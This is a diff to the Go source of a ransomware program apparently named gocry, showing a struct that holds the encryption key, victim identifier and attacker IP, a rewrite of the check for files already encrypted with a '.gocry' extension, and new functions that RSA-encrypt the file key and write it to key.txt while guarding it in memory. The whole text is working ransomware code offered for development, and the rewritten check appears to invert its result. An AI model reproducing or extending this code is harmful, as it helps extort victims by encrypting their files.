@@ -4,10 +4,11 @@ import (
 	"bytes"
 	"errors"
 	"io/ioutil"
-	"log"
 	"os"
+	"path/filepath"
 	"strings"
 
+	"github.com/awnumar/memguard"
 	"github.com/nireo/gocry/crypt"
 	"github.com/nireo/gocry/utils"
 	"github.com/nireo/gocry/victim"
@@ -15,11 +16,12 @@ import (
 
 // Ransomware holds all the needed client information needed to go forward with the ransom.
 type Ransomware struct {
-	Key       []byte
-	PublicKey string
-	RootDir   string
-	IP        string
-	Data      *victim.VictimIndentifier
+	Key         []byte
+	MemguardKey *memguard.Enclave
+	PublicKey   string
+	RootDir     string
+	IP          string
+	Data        *victim.VictimIndentifier
 }
 
 // CheckIfActiveRansom checks for any files with the .gocry extension such that then
@@ -57,31 +59,51 @@ func (rw *Ransomware) CreateRansomInfoFile(message string) error {
 	return nil
 }
 
-func checkIfEncrypted(path string) bool {
-	files, err := ioutil.ReadDir(path)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	for _, f := range files {
-		if f.IsDir() {
-			if encrypted := checkIfEncrypted(path + f.Name()); encrypted {
-				return true
-			}
-		} else {
-			if strings.HasSuffix(f.Name(), ".gocry") {
-				return true
-			}
+func checkIfEncrypted(rootPath string) bool {
+	if err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
 		}
+
+		if info.IsDir() {
+			return nil
+		}
+
+		if strings.HasSuffix(path, ".gocry") {
+			return errors.New("a encrypted file has already been found")
+		}
+
+		return nil
+	}); err != nil {
+		return false
 	}
 
-	return false
+	return true
 }
 
 // WriteKeyFile takes in the ransomware's key and writes the rsa public key encrypted
 // version of the key into a file called 'key.txt'
 func (rw *Ransomware) WriteKeyFile() error {
 	rsaEncryptedKey, err := crypt.EncryptKey(rw.Key, rw.Data.UUID)
+	if err != nil {
+		return err
+	}
+
+	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", rsaEncryptedKey, 0600); err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func (rw *Ransomware) WriteMemSafeKey() error {
+	b, err := rw.MemguardKey.Open()
+	if err != nil {
+		memguard.SafePanic(err)
+	}
+	defer b.Destroy()
+
+	rsaEncryptedKey, err := crypt.EncryptKey(b.Bytes(), rw.Data.UUID)
 	if err != nil {
 		return err
 	}
